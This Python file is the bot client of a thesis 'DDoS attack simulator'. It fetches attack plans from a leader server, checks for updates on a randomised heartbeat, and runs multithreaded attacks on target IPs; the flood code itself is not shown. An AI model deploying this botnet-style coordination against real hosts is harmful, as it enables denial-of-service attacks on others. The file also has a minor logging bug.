#!/usr/bin/env python3
"""
bot.py

Bot client for the *Distributed DDoS Attack Simulator bachelor-thesis project.

DISCLAIMER:
This tool is designed strictly for educational purposes and controlled network security testing.

-----------------------------------------------------------------------------
Scapy Installation Notes
-----------------------------------------------------------------------------
    - Linux: Install scapy via pip or your package manager.
    - Windows: Ensure Npcap (https://npcap.com/#download) is installed before using scapy.
"""

import argparse
import logging
import random
import socket
import sys
import threading
import time
from dataclasses import dataclass
from pathlib import Path
from typing import List

from logger import DetailedLogger
from plan import Plan

# --------------------------------------------------------------------------- #
# Dataclass config
# --------------------------------------------------------------------------- #


@dataclass
class BotConfig:
    leader_ip: str = "127.0.0.1"
    leader_port: int = 9999
    debug: bool = False
    log_file: Path = Path("bot_log.log")

# --------------------------------------------------------------------------- #
# Bot implementation                                                          #
# --------------------------------------------------------------------------- #


class Bot:
    """Connects to a Leader server, downloads an attack plan, and executes it."""

    # --------------------------------------------------------------------- #
    # Constructor & top‑level control                                       #
    # --------------------------------------------------------------------- #

    def __init__(self, cfg: BotConfig) -> None:
        self.cfg = cfg
        self.logger = self._make_logger()
        self.plan_hash = ""              # filled after first connection to Leader
        self.stop_evt = threading.Event()    # global stop (Ctrl-C, after plan)
        self.attack_evt = threading.Event()   # interrupt running attacks

    # ------------------------------- public -------------------------------- #
    def run(self) -> None:
        """Entry-point - fetch plan, start heartbeat, execute indefinitely."""
        try:
            plan_json = self._fetch_plan()
            self.plan_hash = Plan.sha256_json(plan_json)

            # heartbeat keeps the plan up to date
            hb = threading.Thread(
                target=self._heartbeat_loop, name="Heartbeat", daemon=True,)
            hb.start()

            self._execute_plan(Plan.from_json(plan_json))

            # idle until Ctrl-C
            while not self.stop_evt.is_set():
                time.sleep(1)

        except KeyboardInterrupt:
            self.logger.info("CTRL-C received - shutting down")
        except Exception as exc:
            self.logger.error("Fatal error: %s", exc)
        finally:
            self.stop_evt.set()          # stop heartbeat ASAP
            sys.exit(0)

    # ------------------------- internals ----------------------------------- #
    def _make_logger(self) -> DetailedLogger:
        level = logging.DEBUG if self.cfg.debug else logging.INFO
        return DetailedLogger(str(self.cfg.log_file), log_level=level)

    # --------------------------------------------------------------------- #
    # Leader communication helpers
    def _fetch_plan(self) -> str:
        """TCP request: opcode 0 full plan JSON."""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((self.cfg.leader_ip, self.cfg.leader_port))
            s.sendall(b"0")
            chunks: List[bytes] = []
            while (blk := s.recv(4096)):
                chunks.append(blk)
        return b"".join(chunks).decode()

    def _fetch_plan_hash(self) -> str:
        """TCP request: opcode 1  64-byte hex SHA-256 digest."""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((self.cfg.leader_ip, self.cfg.leader_port))
            s.sendall(b"1")
            return s.recv(64).decode()

    # --------------------------------------------------------------------- #
    def _heartbeat_loop(self) -> None:
        self.logger.debug("Heartbeat thread started")
        while not self.stop_evt.is_set():
            interval = random.randint(180, 300)   # 3–5 min
            if self.stop_evt.wait(interval):
                break                             # stop requested

            try:
                new_hash = self._fetch_plan_hash()
                if new_hash != self.plan_hash:
                    self.log.info("Plan update detected - reloading")
                    # interrupt running attacks
                    self.attack_evt.set()
                    raw = self._fetch_plan()
                    self.plan_hash = Plan.sha256_json(raw)
                    self.attack_evt.clear()
                    self._execute_plan(Plan.from_json(raw))
                else:
                    self.logger.debug("Plan unchanged")
            except Exception as exc:
                self.logger.error("Heartbeat failed: %s", exc)

    # --------------------------------------------------------------------- #
    def _execute_plan(self, plan: Plan) -> None:
        """Run each attack in order"""
        for atk in plan.attack_objs:
            if self.stop_evt.is_set():
                break  # global shutdown requested
            self.logger.info("Starting %s on %s with %d thread(s)", type(
                atk).__name__, atk.target_ip, atk.threads,)
            workers: list[threading.Thread] = []

            def _worker() -> None:
                try:
                    atk.wait_until_start()
                    if self.cfg.debug:
                        print(
                            f"Executin on {atk.target_ip} | "f"{type(atk).__name__} | {atk.parameters}", flush=True,)
                    atk.execute()
                    self.logger.info("Finished %s on %s", type(
                        atk).__name__, atk.target_ip)
                except Exception as exc:
                    self.logger.error("Worker error for %s on %s: %s", type(
                        atk).__name__, atk.target_ip, exc,)

            for _ in range(atk.threads):
                t = threading.Thread(target=_worker, daemon=True)
                t.start()
                workers.append(t)

            for t in workers:
                t.join()

            self.logger.info("Attack %s on %s completed",
                             type(atk).__name__, atk.target_ip)

        self.stop_evt.set()  # All attacks in current plan done – requesting shutdown
        if self.cfg.debug:
            print("All attacks finished", flush=True)

    # --------------------------------------------------------------------- #
    # CLI                                                                   #
    # --------------------------------------------------------------------- #
    @staticmethod
    def parse_cli(argv: List[str]) -> BotConfig:
        p = argparse.ArgumentParser(
            description="Bot client for the Distributed DDoS Attack Simulator")
        p.add_argument("leader_ip",   nargs="?", default="127.0.0.1",
                       help="Leader server host (default 127.0.0.1)")
        p.add_argument("leader_port", nargs="?", type=int,
                       default=9999, help="Leader TCP port (default 9999)")
        p.add_argument("-d", "--debug", action="store_true",
                       help="Enable DEBUG logging")
        ns = p.parse_args(argv)

        return BotConfig(ns.leader_ip, ns.leader_port, ns.debug)


# --------------------------------------------------------------------------- #
# Script entry-point                                                          #
# --------------------------------------------------------------------------- #
if __name__ == "__main__":
    config = Bot.parse_cli(sys.argv[1:])
    Bot(config).run()
